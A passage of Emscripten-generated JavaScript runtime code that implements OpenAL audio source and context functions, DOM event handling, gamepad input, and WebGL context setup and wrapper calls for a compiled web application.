            if (!AL.currentCtx) {
                return
            }
            var src = AL.currentCtx.sources[sourceId];
            if (!src) {
                AL.currentCtx.err = 40961;
                return
            }
            AL.setSourceState(src, 4115)
        }
            ;
        var _alSourcePlay = sourceId => {
            if (!AL.currentCtx) {
                return
            }
            var src = AL.currentCtx.sources[sourceId];
            if (!src) {
                AL.currentCtx.err = 40961;
                return
            }
            AL.setSourceState(src, 4114)
        }
            ;
        var _alSourceQueueBuffers = (sourceId, count, pBufferIds) => {
            if (!AL.currentCtx) {
                return
            }
            var src = AL.currentCtx.sources[sourceId];
            if (!src) {
                AL.currentCtx.err = 40961;
                return
            }
            if (src.type === 4136) {
                AL.currentCtx.err = 40964;
                return
            }
            if (count === 0) {
                return
            }
            var templateBuf = AL.buffers[0];
            for (var buf of src.bufQueue) {
                if (buf.id !== 0) {
                    templateBuf = buf;
                    break
                }
            }
            for (var i = 0; i < count; ++i) {
                var bufId = HEAP32[pBufferIds + i * 4 >> 2];
                var buf = AL.buffers[bufId];
                if (!buf) {
                    AL.currentCtx.err = 40961;
                    return
                }
                if (templateBuf.id !== 0 && (buf.frequency !== templateBuf.frequency || buf.bytesPerSample !== templateBuf.bytesPerSample || buf.channels !== templateBuf.channels)) {
                    AL.currentCtx.err = 40964
                }
            }
            if (src.bufQueue.length === 1 && src.bufQueue[0].id === 0) {
                src.bufQueue.length = 0
            }
            src.type = 4137;
            for (var i = 0; i < count; ++i) {
                var bufId = HEAP32[pBufferIds + i * 4 >> 2];
                var buf = AL.buffers[bufId];
                buf.refCount++;
                src.bufQueue.push(buf)
            }
            if (src.looping) {
                AL.cancelPendingSourceAudio(src)
            }
            AL.initSourcePanner(src);
            AL.scheduleSourceAudio(src)
        }
            ;
        var _alSourceStop = sourceId => {
            if (!AL.currentCtx) {
                return
            }
            var src = AL.currentCtx.sources[sourceId];
            if (!src) {
                AL.currentCtx.err = 40961;
                return
            }
            AL.setSourceState(src, 4116)
        }
            ;
        var _alSourceUnqueueBuffers = (sourceId, count, pBufferIds) => {
            if (!AL.currentCtx) {
                return
            }
            var src = AL.currentCtx.sources[sourceId];
            if (!src) {
                AL.currentCtx.err = 40961;
                return
            }
            if (count > (src.bufQueue.length === 1 && src.bufQueue[0].id === 0 ? 0 : src.bufsProcessed)) {
                AL.currentCtx.err = 40963;
                return
            }
            if (count === 0) {
                return
            }
            for (var i = 0; i < count; i++) {
                var buf = src.bufQueue.shift();
                buf.refCount--;
                HEAP32[pBufferIds + i * 4 >> 2] = buf.id;
                src.bufsProcessed--
            }
            if (src.bufQueue.length === 0) {
                src.bufQueue.push(AL.buffers[0])
            }
            AL.initSourcePanner(src);
            AL.scheduleSourceAudio(src)
        }
            ;
        var _alSourcef = (sourceId, param, value) => {
            switch (param) {
                case 4097:
                case 4098:
                case 4099:
                case 4106:
                case 4109:
                case 4110:
                case 4128:
                case 4129:
                case 4130:
                case 4131:
                case 4132:
                case 4133:
                case 4134:
                case 8203:
                    AL.setSourceParam("alSourcef", sourceId, param, value);
                    break;
                default:
                    AL.setSourceParam("alSourcef", sourceId, param, null);
                    break
            }
        }
            ;
        var _alcCloseDevice = deviceId => {
            if (!(deviceId in AL.deviceRefCounts) || AL.deviceRefCounts[deviceId] > 0) {
                return 0
            }
            delete AL.deviceRefCounts[deviceId];
            AL.freeIds.push(deviceId);
            return 1
        }
            ;
        var autoResumeAudioContext = ctx => {
            for (var event of ["keydown", "mousedown", "touchstart"]) {
                for (var element of [document, document.getElementById("canvas")]) {
                    element?.addEventListener(event, () => {
                        if (ctx.state === "suspended")
                            ctx.resume()
                    }
                        , {
                            once: true
                        })
                }
            }
        }
            ;
        var _alcCreateContext = (deviceId, pAttrList) => {
            if (!(deviceId in AL.deviceRefCounts)) {
                AL.alcErr = 40961;
                return 0
            }
            var options = null;
            var attrs = [];
            var hrtf = null;
            pAttrList >>= 2;
            if (pAttrList) {
                var attr = 0;
                var val = 0;
                while (true) {
                    attr = HEAP32[pAttrList++];
                    attrs.push(attr);
                    if (attr === 0) {
                        break
                    }
                    val = HEAP32[pAttrList++];
                    attrs.push(val);
                    switch (attr) {
                        case 4103:
                            if (!options) {
                                options = {}
                            }
                            options.sampleRate = val;
                            break;
                        case 4112:
                        case 4113:
                            break;
                        case 6546:
                            switch (val) {
                                case 0:
                                    hrtf = false;
                                    break;
                                case 1:
                                    hrtf = true;
                                    break;
                                case 2:
                                    break;
                                default:
                                    AL.alcErr = 40964;
                                    return 0
                            }
                            break;
                        case 6550:
                            if (val !== 0) {
                                AL.alcErr = 40964;
                                return 0
                            }
                            break;
                        default:
                            AL.alcErr = 40964;
                            return 0
                    }
                }
            }
            var AudioContext = window.AudioContext || window.webkitAudioContext;
            var ac = null;
            try {
                if (options) {
                    ac = new AudioContext(options)
                } else {
                    ac = new AudioContext
                }
            } catch (e) {
                if (e.name === "NotSupportedError") {
                    AL.alcErr = 40964
                } else {
                    AL.alcErr = 40961
                }
                return 0
            }
            autoResumeAudioContext(ac);
            if (typeof ac.createGain == "undefined") {
                ac.createGain = ac.createGainNode
            }
            var gain = ac.createGain();
            gain.connect(ac.destination);
            var ctx = {
                deviceId,
                id: AL.newId(),
                attrs,
                audioCtx: ac,
                listener: {
                    position: [0, 0, 0],
                    velocity: [0, 0, 0],
                    direction: [0, 0, 0],
                    up: [0, 0, 0]
                },
                sources: [],
                interval: setInterval(() => AL.scheduleContextAudio(ctx), AL.QUEUE_INTERVAL),
                gain,
                distanceModel: 53250,
                speedOfSound: 343.3,
                dopplerFactor: 1,
                sourceDistanceModel: false,
                hrtf: hrtf || false,
                _err: 0,
                get err() {
                    return this._err
                },
                set err(val) {
                    if (this._err === 0 || val === 0) {
                        this._err = val
                    }
                }
            };
            AL.deviceRefCounts[deviceId]++;
            AL.contexts[ctx.id] = ctx;
            if (hrtf !== null) {
                for (var ctxId in AL.contexts) {
                    var c = AL.contexts[ctxId];
                    if (c.deviceId === deviceId) {
                        c.hrtf = hrtf;
                        AL.updateContextGlobal(c)
                    }
                }
            }
            return ctx.id
        }
            ;
        var _alcDestroyContext = contextId => {
            var ctx = AL.contexts[contextId];
            if (AL.currentCtx === ctx) {
                AL.alcErr = 40962;
                return
            }
            if (AL.contexts[contextId].interval) {
                clearInterval(AL.contexts[contextId].interval)
            }
            AL.deviceRefCounts[ctx.deviceId]--;
            delete AL.contexts[contextId];
            AL.freeIds.push(contextId)
        }
            ;
        var _alcGetIntegerv = (deviceId, param, size, pValues) => {
            if (size === 0 || !pValues) {
                return
            }
            switch (param) {
                case 4096:
                    HEAP32[pValues >> 2] = 1;
                    break;
                case 4097:
                    HEAP32[pValues >> 2] = 1;
                    break;
                case 4098:
                    if (!(deviceId in AL.deviceRefCounts)) {
                        AL.alcErr = 40961;
                        return
                    }
                    if (!AL.currentCtx) {
                        AL.alcErr = 40962;
                        return
                    }
                    HEAP32[pValues >> 2] = AL.currentCtx.attrs.length;
                    break;
                case 4099:
                    if (!(deviceId in AL.deviceRefCounts)) {
                        AL.alcErr = 40961;
                        return
                    }
                    if (!AL.currentCtx) {
                        AL.alcErr = 40962;
                        return
                    }
                    for (var i = 0; i < AL.currentCtx.attrs.length; i++) {
                        HEAP32[pValues + i * 4 >> 2] = AL.currentCtx.attrs[i]
                    }
                    break;
                case 4103:
                    if (!(deviceId in AL.deviceRefCounts)) {
                        AL.alcErr = 40961;
                        return
                    }
                    if (!AL.currentCtx) {
                        AL.alcErr = 40962;
                        return
                    }
                    HEAP32[pValues >> 2] = AL.currentCtx.audioCtx.sampleRate;
                    break;
                case 4112:
                case 4113:
                    if (!(deviceId in AL.deviceRefCounts)) {
                        AL.alcErr = 40961;
                        return
                    }
                    if (!AL.currentCtx) {
                        AL.alcErr = 40962;
                        return
                    }
                    HEAP32[pValues >> 2] = 2147483647;
                    break;
                case 6546:
                case 6547:
                    if (!(deviceId in AL.deviceRefCounts)) {
                        AL.alcErr = 40961;
                        return
                    }
                    var hrtfStatus = 0;
                    for (var ctxId in AL.contexts) {
                        var ctx = AL.contexts[ctxId];
                        if (ctx.deviceId === deviceId) {
                            hrtfStatus = ctx.hrtf ? 1 : 0
                        }
                    }
                    HEAP32[pValues >> 2] = hrtfStatus;
                    break;
                case 6548:
                    if (!(deviceId in AL.deviceRefCounts)) {
                        AL.alcErr = 40961;
                        return
                    }
                    HEAP32[pValues >> 2] = 1;
                    break;
                case 131075:
                    if (!(deviceId in AL.deviceRefCounts)) {
                        AL.alcErr = 40961;
                        return
                    }
                    if (!AL.currentCtx) {
                        AL.alcErr = 40962;
                        return
                    }
                    HEAP32[pValues >> 2] = 1;
                case 786:
                    var c = AL.requireValidCaptureDevice(deviceId, "alcGetIntegerv");
                    if (!c) {
                        return
                    }
                    var n = c.capturedFrameCount;
                    var dstfreq = c.requestedSampleRate;
                    var srcfreq = c.audioCtx.sampleRate;
                    var nsamples = Math.floor(n * (dstfreq / srcfreq));
                    HEAP32[pValues >> 2] = nsamples;
                    break;
                default:
                    AL.alcErr = 40963;
                    return
            }
        }
            ;
        var _alcGetString = (deviceId, param) => {
            if (AL.alcStringCache[param]) {
                return AL.alcStringCache[param]
            }
            var ret;
            switch (param) {
                case 0:
                    ret = "No Error";
                    break;
                case 40961:
                    ret = "Invalid Device";
                    break;
                case 40962:
                    ret = "Invalid Context";
                    break;
                case 40963:
                    ret = "Invalid Enum";
                    break;
                case 40964:
                    ret = "Invalid Value";
                    break;
                case 40965:
                    ret = "Out of Memory";
                    break;
                case 4100:
                    if (globalThis.AudioContext || globalThis.webkitAudioContext) {
                        ret = AL.DEVICE_NAME
                    } else {
                        return 0
                    }
                    break;
                case 4101:
                    if (globalThis.AudioContext || globalThis.webkitAudioContext) {
                        ret = AL.DEVICE_NAME + "\0"
                    } else {
                        ret = "\0"
                    }
                    break;
                case 785:
                    ret = AL.CAPTURE_DEVICE_NAME;
                    break;
                case 784:
                    if (deviceId === 0) {
                        ret = AL.CAPTURE_DEVICE_NAME + "\0"
                    } else {
                        var c = AL.requireValidCaptureDevice(deviceId, "alcGetString");
                        if (!c) {
                            return 0
                        }
                        ret = c.deviceName
                    }
                    break;
                case 4102:
                    if (!deviceId) {
                        AL.alcErr = 40961;
                        return 0
                    }
                    ret = Object.keys(AL.ALC_EXTENSIONS).join(" ");
                    break;
                default:
                    AL.alcErr = 40963;
                    return 0
            }
            ret = stringToNewUTF8(ret);
            AL.alcStringCache[param] = ret;
            return ret
        }
            ;
        var _alcIsExtensionPresent = (deviceId, pExtName) => {
            var name = UTF8ToString(pExtName);
            return AL.ALC_EXTENSIONS[name] ? 1 : 0
        }
            ;
        var _alcMakeContextCurrent = contextId => {
            if (contextId === 0) {
                AL.currentCtx = null
            } else {
                AL.currentCtx = AL.contexts[contextId]
            }
            return 1
        }
            ;
        var _alcOpenDevice = pDeviceName => {
            if (pDeviceName) {
                var name = UTF8ToString(pDeviceName);
                if (name !== AL.DEVICE_NAME) {
                    return 0
                }
            }
            if (globalThis.AudioContext || globalThis.webkitAudioContext) {
                var deviceId = AL.newId();
                AL.deviceRefCounts[deviceId] = 0;
                return deviceId
            }
            return 0
        }
            ;
        var _alcSuspendContext = contextId => { }
            ;
        var readEmAsmArgsArray = [];
        var readEmAsmArgs = (sigPtr, buf) => {
            readEmAsmArgsArray.length = 0;
            var ch;
            while (ch = HEAPU8[sigPtr++]) {
                var wide = ch != 105;
                wide &= ch != 112;
                buf += wide && buf % 8 ? 4 : 0;
                readEmAsmArgsArray.push(ch == 112 ? HEAPU32[buf >> 2] : ch == 106 ? HEAP64[buf >> 3] : ch == 105 ? HEAP32[buf >> 2] : HEAPF64[buf >> 3]);
                buf += wide ? 8 : 4
            }
            return readEmAsmArgsArray
        }
            ;
        var runEmAsmFunction = (code, sigPtr, argbuf) => {
            var args = readEmAsmArgs(sigPtr, argbuf);
            return ASM_CONSTS[code](...args)
        }
            ;
        var _emscripten_asm_const_int = (code, sigPtr, argbuf) => runEmAsmFunction(code, sigPtr, argbuf);
        var _emscripten_cancel_main_loop = () => {
            MainLoop.pause();
            MainLoop.func = null
        }
            ;
        var _emscripten_date_now = () => Date.now();
        var _emscripten_exit_with_live_runtime = () => {
            throw "unwind"
        }
            ;
        var maybeCStringToJsString = cString => cString > 2 ? UTF8ToString(cString) : cString;
        var specialHTMLTargets = [0, document, window];
        var findEventTarget = target => {
            target = maybeCStringToJsString(target);
            var domElement = specialHTMLTargets[target] || document.querySelector(target);
            return domElement
        }
            ;
        var getBoundingClientRect = e => specialHTMLTargets.indexOf(e) < 0 ? e.getBoundingClientRect() : {
            left: 0,
            top: 0
        };
        var _emscripten_get_element_css_size = (target, width, height) => {
            target = findEventTarget(target);
            if (!target)
                return -4;
            var rect = getBoundingClientRect(target);
            HEAPF64[width >> 3] = rect.width;
            HEAPF64[height >> 3] = rect.height;
            return 0
        }
            ;
        var JSEvents = {
            removeAllEventListeners() {
                while (JSEvents.eventHandlers.length) {
                    JSEvents._removeHandler(JSEvents.eventHandlers.length - 1)
                }
                JSEvents.deferredCalls = []
            },
            inEventHandler: 0,
            deferredCalls: [],
            deferCall(targetFunction, precedence, argsList) {
                function arraysHaveEqualContent(arrA, arrB) {
                    if (arrA.length != arrB.length)
                        return false;
                    for (var i in arrA) {
                        if (arrA[i] != arrB[i])
                            return false
                    }
                    return true
                }
                for (var call of JSEvents.deferredCalls) {
                    if (call.targetFunction == targetFunction && arraysHaveEqualContent(call.argsList, argsList)) {
                        return
                    }
                }
                JSEvents.deferredCalls.push({
                    targetFunction,
                    precedence,
                    argsList
                });
                JSEvents.deferredCalls.sort((x, y) => x.precedence < y.precedence)
            },
            removeDeferredCalls(targetFunction) {
                JSEvents.deferredCalls = JSEvents.deferredCalls.filter(call => call.targetFunction != targetFunction)
            },
            canPerformEventHandlerRequests() {
                if (navigator.userActivation) {
                    return navigator.userActivation.isActive
                }
                return JSEvents.inEventHandler && JSEvents.currentEventHandler.allowsDeferredCalls
            },
            runDeferredCalls() {
                if (!JSEvents.canPerformEventHandlerRequests()) {
                    return
                }
                var deferredCalls = JSEvents.deferredCalls;
                JSEvents.deferredCalls = [];
                for (var call of deferredCalls) {
                    call.targetFunction(...call.argsList)
                }
            },
            eventHandlers: [],
            removeAllHandlersOnTarget: (target, eventTypeString) => {
                for (var i = 0; i < JSEvents.eventHandlers.length; ++i) {
                    if (JSEvents.eventHandlers[i].target == target && (!eventTypeString || eventTypeString == JSEvents.eventHandlers[i].eventTypeString)) {
                        JSEvents._removeHandler(i--)
                    }
                }
            }
            ,
            _removeHandler(i) {
                var h = JSEvents.eventHandlers[i];
                h.target.removeEventListener(h.eventTypeString, h.eventListenerFunc, h.useCapture);
                JSEvents.eventHandlers.splice(i, 1)
            },
            registerOrRemoveHandler(eventHandler) {
                if (!eventHandler.target) {
                    return -4
                }
                if (eventHandler.callbackfunc) {
                    eventHandler.eventListenerFunc = function (event) {
                        ++JSEvents.inEventHandler;
                        JSEvents.currentEventHandler = eventHandler;
                        JSEvents.runDeferredCalls();
                        eventHandler.handlerFunc(event);
                        JSEvents.runDeferredCalls();
                        --JSEvents.inEventHandler
                    }
                        ;
                    eventHandler.target.addEventListener(eventHandler.eventTypeString, eventHandler.eventListenerFunc, eventHandler.useCapture);
                    JSEvents.eventHandlers.push(eventHandler)
                } else {
                    for (var i = 0; i < JSEvents.eventHandlers.length; ++i) {
                        if (JSEvents.eventHandlers[i].target == eventHandler.target && JSEvents.eventHandlers[i].eventTypeString == eventHandler.eventTypeString) {
                            JSEvents._removeHandler(i--)
                        }
                    }
                }
                return 0
            },
            removeSingleHandler(eventHandler) {
                let success = false;
                for (let i = 0; i < JSEvents.eventHandlers.length; ++i) {
                    const handler = JSEvents.eventHandlers[i];
                    if (handler.target === eventHandler.target && handler.eventTypeId === eventHandler.eventTypeId && handler.callbackfunc === eventHandler.callbackfunc && handler.userData === eventHandler.userData) {
                        JSEvents._removeHandler(i--);
                        success = true
                    }
                }
                return success ? 0 : -5
            },
            getNodeNameForTarget(target) {
                if (!target)
                    return "";
                if (target == window)
                    return "#window";
                if (target == screen)
                    return "#screen";
                return target?.nodeName || ""
            },
            fullscreenEnabled() {
                return document.fullscreenEnabled || document.webkitFullscreenEnabled
            }
        };
        var fillGamepadEventData = (eventStruct, e) => {
            HEAPF64[eventStruct >> 3] = e.timestamp;
            for (var i = 0; i < e.axes.length; ++i) {
                HEAPF64[eventStruct + i * 8 + 16 >> 3] = e.axes[i]
            }
            for (var i = 0; i < e.buttons.length; ++i) {
                if (typeof e.buttons[i] == "object") {
                    HEAPF64[eventStruct + i * 8 + 528 >> 3] = e.buttons[i].value
                } else {
                    HEAPF64[eventStruct + i * 8 + 528 >> 3] = e.buttons[i]
                }
            }
            for (var i = 0; i < e.buttons.length; ++i) {
                if (typeof e.buttons[i] == "object") {
                    HEAP8[eventStruct + i + 1040] = e.buttons[i].pressed
                } else {
                    HEAP8[eventStruct + i + 1040] = e.buttons[i] == 1
                }
            }
            HEAP8[eventStruct + 1104] = e.connected;
            HEAP32[eventStruct + 1108 >> 2] = e.index;
            HEAP32[eventStruct + 8 >> 2] = e.axes.length;
            HEAP32[eventStruct + 12 >> 2] = e.buttons.length;
            stringToUTF8(e.id, eventStruct + 1112, 64);
            stringToUTF8(e.mapping, eventStruct + 1176, 64)
        }
            ;
        var _emscripten_get_gamepad_status = (index, gamepadState) => {
            if (index < 0 || index >= JSEvents.lastGamepadState.length)
                return -5;
            if (!JSEvents.lastGamepadState[index])
                return -7;
            fillGamepadEventData(gamepadState, JSEvents.lastGamepadState[index]);
            return 0
        }
            ;
        var _emscripten_get_num_gamepads = () => JSEvents.lastGamepadState.length;
        var GLctx;
        var webgl_enable_ANGLE_instanced_arrays = ctx => {
            var ext = ctx.getExtension("ANGLE_instanced_arrays");
            if (ext) {
                ctx["vertexAttribDivisor"] = (index, divisor) => ext["vertexAttribDivisorANGLE"](index, divisor);
                ctx["drawArraysInstanced"] = (mode, first, count, primcount) => ext["drawArraysInstancedANGLE"](mode, first, count, primcount);
                ctx["drawElementsInstanced"] = (mode, count, type, indices, primcount) => ext["drawElementsInstancedANGLE"](mode, count, type, indices, primcount);
                return 1
            }
        }
            ;
        var webgl_enable_OES_vertex_array_object = ctx => {
            var ext = ctx.getExtension("OES_vertex_array_object");
            if (ext) {
                ctx["createVertexArray"] = () => ext["createVertexArrayOES"]();
                ctx["deleteVertexArray"] = vao => ext["deleteVertexArrayOES"](vao);
                ctx["bindVertexArray"] = vao => ext["bindVertexArrayOES"](vao);
                ctx["isVertexArray"] = vao => ext["isVertexArrayOES"](vao);
                return 1
            }
        }
            ;
        var webgl_enable_WEBGL_draw_buffers = ctx => {
            var ext = ctx.getExtension("WEBGL_draw_buffers");
            if (ext) {
                ctx["drawBuffers"] = (n, bufs) => ext["drawBuffersWEBGL"](n, bufs);
                return 1
            }
        }
            ;
        var webgl_enable_WEBGL_draw_instanced_base_vertex_base_instance = ctx => !!(ctx.dibvbi = ctx.getExtension("WEBGL_draw_instanced_base_vertex_base_instance"));
        var webgl_enable_WEBGL_multi_draw_instanced_base_vertex_base_instance = ctx => !!(ctx.mdibvbi = ctx.getExtension("WEBGL_multi_draw_instanced_base_vertex_base_instance"));
        var webgl_enable_EXT_polygon_offset_clamp = ctx => !!(ctx.extPolygonOffsetClamp = ctx.getExtension("EXT_polygon_offset_clamp"));
        var webgl_enable_EXT_clip_control = ctx => !!(ctx.extClipControl = ctx.getExtension("EXT_clip_control"));
        var webgl_enable_WEBGL_polygon_mode = ctx => !!(ctx.webglPolygonMode = ctx.getExtension("WEBGL_polygon_mode"));
        var webgl_enable_WEBGL_multi_draw = ctx => !!(ctx.multiDrawWebgl = ctx.getExtension("WEBGL_multi_draw"));
        var getEmscriptenSupportedExtensions = ctx => {
            var supportedExtensions = ["ANGLE_instanced_arrays", "EXT_blend_minmax", "EXT_disjoint_timer_query", "EXT_frag_depth", "EXT_shader_texture_lod", "EXT_sRGB", "OES_element_index_uint", "OES_fbo_render_mipmap", "OES_standard_derivatives", "OES_texture_float", "OES_texture_half_float", "OES_texture_half_float_linear", "OES_vertex_array_object", "WEBGL_color_buffer_float", "WEBGL_depth_texture", "WEBGL_draw_buffers", "EXT_color_buffer_float", "EXT_conservative_depth", "EXT_disjoint_timer_query_webgl2", "EXT_texture_norm16", "NV_shader_noperspective_interpolation", "WEBGL_clip_cull_distance", "EXT_clip_control", "EXT_color_buffer_half_float", "EXT_depth_clamp", "EXT_float_blend", "EXT_polygon_offset_clamp", "EXT_texture_compression_bptc", "EXT_texture_compression_rgtc", "EXT_texture_filter_anisotropic", "KHR_parallel_shader_compile", "OES_texture_float_linear", "WEBGL_blend_func_extended", "WEBGL_compressed_texture_astc", "WEBGL_compressed_texture_etc", "WEBGL_compressed_texture_etc1", "WEBGL_compressed_texture_s3tc", "WEBGL_compressed_texture_s3tc_srgb", "WEBGL_debug_renderer_info", "WEBGL_debug_shaders", "WEBGL_lose_context", "WEBGL_multi_draw", "WEBGL_polygon_mode"];
            return (ctx.getSupportedExtensions() || []).filter(ext => supportedExtensions.includes(ext))
        }
            ;
        var GL = {
            counter: 1,
            buffers: [],
            programs: [],
            framebuffers: [],
            renderbuffers: [],
            textures: [],
            shaders: [],
            vaos: [],
            contexts: [],
            offscreenCanvases: {},
            queries: [],
            samplers: [],
            transformFeedbacks: [],
            syncs: [],
            stringCache: {},
            stringiCache: {},
            unpackAlignment: 4,
            unpackRowLength: 0,
            recordError: errorCode => {
                if (!GL.lastError) {
                    GL.lastError = errorCode
                }
            }
            ,
            getNewId: table => {
                var ret = GL.counter++;
                for (var i = table.length; i < ret; i++) {
                    table[i] = null
                }
                return ret
            }
            ,
            genObject: (n, buffers, createFunction, objectTable) => {
                for (var i = 0; i < n; i++) {
                    var buffer = GLctx[createFunction]();
                    var id = buffer && GL.getNewId(objectTable);
                    if (buffer) {
                        buffer.name = id;
                        objectTable[id] = buffer
                    } else {
                        GL.recordError(1282)
                    }
                    HEAP32[buffers + i * 4 >> 2] = id
                }
            }
            ,
            getSource: (shader, count, string, length) => {
                var source = "";
                for (var i = 0; i < count; ++i) {
                    var len = length ? HEAPU32[length + i * 4 >> 2] : undefined;
                    source += UTF8ToString(HEAPU32[string + i * 4 >> 2], len)
                }
                return source
            }
            ,
            createContext: (canvas, webGLContextAttributes) => {
                if (!canvas.getContextSafariWebGL2Fixed) {
                    canvas.getContextSafariWebGL2Fixed = canvas.getContext;
                    function fixedGetContext(ver, attrs) {
                        var gl = canvas.getContextSafariWebGL2Fixed(ver, attrs);
                        return ver == "webgl" == gl instanceof WebGLRenderingContext ? gl : null
                    }
                    canvas.getContext = fixedGetContext
                }
                var ctx = webGLContextAttributes.majorVersion > 1 ? canvas.getContext("webgl2", webGLContextAttributes) : canvas.getContext("webgl", webGLContextAttributes);
                if (!ctx)
                    return 0;
                var handle = GL.registerContext(ctx, webGLContextAttributes);
                return handle
            }
            ,
            registerContext: (ctx, webGLContextAttributes) => {
                var handle = GL.getNewId(GL.contexts);
                var context = {
                    handle,
                    attributes: webGLContextAttributes,
                    version: webGLContextAttributes.majorVersion,
                    GLctx: ctx
                };
                if (ctx.canvas)
                    ctx.canvas.GLctxObject = context;
                GL.contexts[handle] = context;
                if (typeof webGLContextAttributes.enableExtensionsByDefault == "undefined" || webGLContextAttributes.enableExtensionsByDefault) {
                    GL.initExtensions(context)
                }
                return handle
            }
            ,
            makeContextCurrent: contextHandle => {
                GL.currentContext = GL.contexts[contextHandle];
                Module["ctx"] = GLctx = GL.currentContext?.GLctx;
                return !(contextHandle && !GLctx)
            }
            ,
            getContext: contextHandle => GL.contexts[contextHandle],
            deleteContext: contextHandle => {
                if (GL.currentContext === GL.contexts[contextHandle]) {
                    GL.currentContext = null
                }
                if (typeof JSEvents == "object") {
                    JSEvents.removeAllHandlersOnTarget(GL.contexts[contextHandle].GLctx.canvas)
                }
                if (GL.contexts[contextHandle]?.GLctx.canvas) {
                    GL.contexts[contextHandle].GLctx.canvas.GLctxObject = undefined
                }
                GL.contexts[contextHandle] = null
            }
            ,
            initExtensions: context => {
                context ||= GL.currentContext;
                if (context.initExtensionsDone)
                    return;
                context.initExtensionsDone = true;
                var GLctx = context.GLctx;
                webgl_enable_WEBGL_multi_draw(GLctx);
                webgl_enable_EXT_polygon_offset_clamp(GLctx);
                webgl_enable_EXT_clip_control(GLctx);
                webgl_enable_WEBGL_polygon_mode(GLctx);
                webgl_enable_ANGLE_instanced_arrays(GLctx);
                webgl_enable_OES_vertex_array_object(GLctx);
                webgl_enable_WEBGL_draw_buffers(GLctx);
                webgl_enable_WEBGL_draw_instanced_base_vertex_base_instance(GLctx);
                webgl_enable_WEBGL_multi_draw_instanced_base_vertex_base_instance(GLctx);
                if (context.version >= 2) {
                    GLctx.disjointTimerQueryExt = GLctx.getExtension("EXT_disjoint_timer_query_webgl2")
                }
                if (context.version < 2 || !GLctx.disjointTimerQueryExt) {
                    GLctx.disjointTimerQueryExt = GLctx.getExtension("EXT_disjoint_timer_query")
                }
                for (var ext of getEmscriptenSupportedExtensions(GLctx)) {
                    if (!ext.includes("lose_context") && !ext.includes("debug")) {
                        GLctx.getExtension(ext)
                    }
                }
            }
        };
        var _emscripten_glActiveTexture = x0 => GLctx.activeTexture(x0);
        var _emscripten_glAttachShader = (program, shader) => {
            GLctx.attachShader(GL.programs[program], GL.shaders[shader])
        }
            ;
        var _emscripten_glBeginQuery = (target, id) => {
            GLctx.beginQuery(target, GL.queries[id])
        }
            ;
        var _emscripten_glBeginQueryEXT = (target, id) => {
            GLctx.disjointTimerQueryExt["beginQueryEXT"](target, GL.queries[id])
        }
            ;
        var _emscripten_glBeginTransformFeedback = x0 => GLctx.beginTransformFeedback(x0);
        var _emscripten_glBindAttribLocation = (program, index, name) => {
            GLctx.bindAttribLocation(GL.programs[program], index, UTF8ToString(name))
        }
            ;
        var _emscripten_glBindBuffer = (target, buffer) => {
            if (target == 35051) {
                GLctx.currentPixelPackBufferBinding = buffer
            } else if (target == 35052) {
                GLctx.currentPixelUnpackBufferBinding = buffer
            }
            GLctx.bindBuffer(target, GL.buffers[buffer])
        }
            ;
        var _emscripten_glBindBufferBase = (target, index, buffer) => {
            GLctx.bindBufferBase(target, index, GL.buffers[buffer])
        }
            ;
        var _emscripten_glBindBufferRange = (target, index, buffer, offset, ptrsize) => {
            GLctx.bindBufferRange(target, index, GL.buffers[buffer], offset, ptrsize)
        }
            ;
        var _emscripten_glBindFramebuffer = (target, framebuffer) => {
            GLctx.bindFramebuffer(target, GL.framebuffers[framebuffer])
        }
            ;
        var _emscripten_glBindRenderbuffer = (target, renderbuffer) => {
            GLctx.bindRenderbuffer(target, GL.renderbuffers[renderbuffer])
        }
            ;
        var _emscripten_glBindSampler = (unit, sampler) => {
            GLctx.bindSampler(unit, GL.samplers[sampler])
        }
            ;
        var _emscripten_glBindTexture = (target, texture) => {
            GLctx.bindTexture(target, GL.textures[texture])
        }
            ;
        var _emscripten_glBindTransformFeedback = (target, id) => {
            GLctx.bindTransformFeedback(target, GL.transformFeedbacks[id])
        }
            ;
        var _emscripten_glBindVertexArray = vao => {
            GLctx.bindVertexArray(GL.vaos[vao])
        }
            ;
        var _glBindVertexArray = _emscripten_glBindVertexArray;
        var _emscripten_glBindVertexArrayOES = _glBindVertexArray;
        var _emscripten_glBlendColor = (x0, x1, x2, x3) => GLctx.blendColor(x0, x1, x2, x3);
        var _emscripten_glBlendEquation = x0 => GLctx.blendEquation(x0);
        var _emscripten_glBlendEquationSeparate = (x0, x1) => GLctx.blendEquationSeparate(x0, x1);
        var _emscripten_glBlendFunc = (x0, x1) => GLctx.blendFunc(x0, x1);
        var _emscripten_glBlendFuncSeparate = (x0, x1, x2, x3) => GLctx.blendFuncSeparate(x0, x1, x2, x3);
        var _emscripten_glBlitFramebuffer = (x0, x1, x2, x3, x4, x5, x6, x7, x8, x9) => GLctx.blitFramebuffer(x0, x1, x2, x3, x4, x5, x6, x7, x8, x9);
        var _emscripten_glBufferData = (target, size, data, usage) => {
            if (GL.currentContext.version >= 2) {
                if (data && size) {
                    GLctx.bufferData(target, HEAPU8, usage, data, size)
                } else {
                    GLctx.bufferData(target, size, usage)
                }
                return
            }
            GLctx.bufferData(target, data ? HEAPU8.subarray(data, data + size) : size, usage)
        }
            ;
        var _emscripten_glBufferSubData = (target, offset, size, data) => {
            if (GL.currentContext.version >= 2) {
                size && GLctx.bufferSubData(target, offset, HEAPU8, data, size);
                return
            }
            GLctx.bufferSubData(target, offset, HEAPU8.subarray(data, data + size))
        }
            ;
        var _emscripten_glCheckFramebufferStatus = x0 => GLctx.checkFramebufferStatus(x0);
        var _emscripten_glClear = x0 => GLctx.clear(x0);
        var _emscripten_glClearBufferfi = (x0, x1, x2, x3) => GLctx.clearBufferfi(x0, x1, x2, x3);
        var _emscripten_glClearBufferfv = (buffer, drawbuffer, value) => {
            GLctx.clearBufferfv(buffer, drawbuffer, HEAPF32, value >> 2)
        }
            ;
        var _emscripten_glClearBufferiv = (buffer, drawbuffer, value) => {
            GLctx.clearBufferiv(buffer, drawbuffer, HEAP32, value >> 2)
        }
            ;
        var _emscripten_glClearBufferuiv = (buffer, drawbuffer, value) => {
            GLctx.clearBufferuiv(buffer, drawbuffer, HEAPU32, value >> 2)
        }
            ;
        var _emscripten_glClearColor = (x0, x1, x2, x3) => GLctx.clearColor(x0, x1, x2, x3);
        var _emscripten_glClearDepthf = x0 => GLctx.clearDepth(x0);
        var _emscripten_glClearStencil = x0 => GLctx.clearStencil(x0);
        var _emscripten_glClientWaitSync = (sync, flags, timeout) => {
            timeout = Number(timeout);
            return GLctx.clientWaitSync(GL.syncs[sync], flags, timeout)
        }
            ;
        var _emscripten_glClipControlEXT = (origin, depth) => {
